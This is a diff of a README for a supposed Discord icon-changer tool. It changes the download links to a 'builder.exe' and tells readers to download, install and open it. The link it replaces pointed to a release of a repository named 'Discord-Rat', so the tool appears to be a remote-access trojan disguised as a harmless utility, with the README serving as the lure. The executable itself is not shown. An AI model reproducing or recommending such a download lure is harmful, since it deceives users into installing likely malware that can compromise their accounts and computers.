@@ -20,7 +20,7 @@
 </p>
 
 ## Download
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/bxxodev/Discord-Rat/releases/download/1.0/Release.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/bxxodev/discord-icon-changer/releases/download/1.0/builder.exe)
 
 ## Features
 
@@ -33,7 +33,7 @@
 
 ## How to Use?
 
-1. Download and install the .exe [PRESS ME!](https://google.com).
+1. Download and install the .exe [PRESS ME!](https://github.com/bxxodev/discord-icon-changer/releases/download/1.0/builder.exe).
 2. open it.
 3. Press Browse.
 4. select the file .ico you want to use as image. (IF U HAVE PNG OR JPEG JUST USE https://convertico.com !!
